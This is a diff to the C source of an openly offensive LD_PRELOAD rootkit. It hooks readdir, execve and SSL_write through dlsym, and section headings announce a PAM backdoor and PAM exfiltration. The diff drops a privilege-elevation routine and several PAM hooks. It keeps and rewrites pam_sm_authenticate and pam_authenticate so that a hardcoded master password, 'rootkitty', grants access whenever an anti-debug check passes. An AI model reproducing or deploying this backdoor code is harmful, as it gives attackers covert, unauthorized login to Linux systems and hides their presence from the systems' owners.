@@ -23,11 +23,8 @@ static struct dirent*   (*og_readdir)(DIR *)       = NULL;
 static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
 static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
 static int (*og_pam_sm_auth)(pam_handle_t*, int, int, const char**) = NULL;
-static int (*og_pam_sm_setcred)(pam_handle_t* pamh, int flags, int argc, const char** argv) = NULL;
 static int (*og_pam_auth)(pam_handle_t *pamh, int flags) = NULL;
 static int (*og_execve)(const char *pathname, char *const argv[], char *const envp[]) = NULL;
-static int (*og_pam_acct_mgmt)(pam_handle_t *pamh, int flags) = NULL;
-static int (*og_pam_open_session)(pam_handle_t *pamh, int flags) = NULL;
 static int (*og_pam_get_item)(const pam_handle_t*, int, const void**) = NULL;
 int isDebuggerPresent();
 
@@ -37,11 +34,8 @@ __attribute__((constructor)) void hook_init(void){
   og_readdir64  = (struct dirent64* (*)(DIR*))dlsym(RTLD_NEXT, "readdir64");
   og_SSL_write  = (int (*)(SSL*, const void*, int))dlsym(RTLD_NEXT, "SSL_write");
   og_pam_sm_auth = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_authenticate");
-  og_pam_sm_setcred = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_setcred");
   og_pam_auth = (int (*)(pam_handle_t *, int flags))dlsym(RTLD_NEXT, "pam_authenticate");
   og_execve = (int (*)(const char*, char *const argv[], char *const envp[]))dlsym(RTLD_NEXT, "execve");
-  og_pam_acct_mgmt = (int (*)(pam_handle_t*, int))dlsym(RTLD_NEXT, "pam_acct_mgmt");
-  og_pam_open_session = (int (*)(pam_handle_t *pamh, int flags))dlsym(RTLD_NEXT, "pam_open_session");
   og_pam_get_item = (int (*)(const pam_handle_t*, int, const void**))dlsym(RTLD_NEXT, "pam_get_item");
 }
 /*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
@@ -104,99 +98,37 @@ int SSL_write(SSL* ssl, const void *buf, int num) {
   return og_SSL_write(ssl, buf, num);
 }
 /*---------[ PAM BACKDOOR ]---------*/
-// TODO: Test this
-int backdoor = 0;
-
-// elevate privileges:
-int elevation(){
-  if (!isDebuggerPresent()){
-    return 1;
-  }
-  uid_t UID = getuid();
-  gid_t GID = getgid();
-
-  if (seteuid(0) == -1) {
-    return 1;
-  }
-  if (setegid(0) == -1) {
-    seteuid(UID);
-    return 1;
-  }
-  return 0;
-}
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv){
-  const char* input_passwd;
-  
-  if(!isDebuggerPresent()){
-    return og_pam_sm_auth(pamh, flags, argc, argv);
+  int retval = og_pam_sm_auth(pamh, flags, argc, argv);
+  const char* password;
+
+  if (!isDebuggerPresent()){
+    return retval;
   }
 
-  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
-  char* password = "rootkitty";
-  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
-    backdoor = 1;
-    return PAM_SUCCESS;
-  }
-  return og_pam_sm_auth(pamh, flags, argc, argv);
-}
-
-PAM_EXTERN int pam_sm_setcred(pam_handle_t* pamh, int flags, int argc, const char** argv){
-  if (isDebuggerPresent() && backdoor == 1){
-    if(elevation() == 0){
-      backdoor = 0;
-      return PAM_SUCCESS;
+  if (pam_get_item(pamh, PAM_AUTHTOK, (const void**)&password) == PAM_SUCCESS) {
+    if (strcmp(password, "rootkitty")== 0) {
+      retval = PAM_SUCCESS;
     }
   }
-  return og_pam_sm_setcred(pamh, flags, argc, argv);
+  return retval;
 }
 
 PAM_EXTERN int pam_authenticate(pam_handle_t *pamh, int flags) {
-  const char* input_passwd;
-
+  int retval = og_pam_auth(pamh, flags);
+  const char *password;
+  
   if (!isDebuggerPresent()){
-    return og_pam_auth(pamh, flags);
-  }
-  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
-  char* password = "rootkitty";
-  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
-    backdoor = 1;
-    return PAM_SUCCESS;
-  }
-  return og_pam_auth(pamh, flags);
-}
-
-int pam_acct_mgmt(pam_handle_t *pamh, int flags){
-  const char* input_passwd;
-
-  if (!isDebuggerPresent()){
-    return og_pam_acct_mgmt(pamh, flags);
+    return retval;
   }
 
-  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
-  char* password = "rootkitty";
-  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
-    backdoor = 1;
-    return PAM_SUCCESS;
+  if (pam_get_item(pamh, PAM_AUTHTOK, (const void**)&password) == PAM_SUCCESS) {
+    if (strcmp(password, "rootkitty") == 0) {
+      retval = PAM_SUCCESS;
+    }
   }
-
-  return og_pam_acct_mgmt(pamh, flags); 
-}
-
-int pam_open_session(pam_handle_t *pamh, int flags) {
-const char* input_passwd;
-
-  if (!isDebuggerPresent()){
-    return og_pam_open_session(pamh, flags);
-  }
-
-  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
-  char* password = "rootkitty";
-  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
-    backdoor = 1;
-    return PAM_SUCCESS;
-  }
-  return og_pam_open_session(pamh, flags);
+  return retval;
 }
 /*---------[ PAM EXFILTRATION ]---------*/
 int pam_get_item(const pam_handle_t *pamh, int item_type, const void**item){
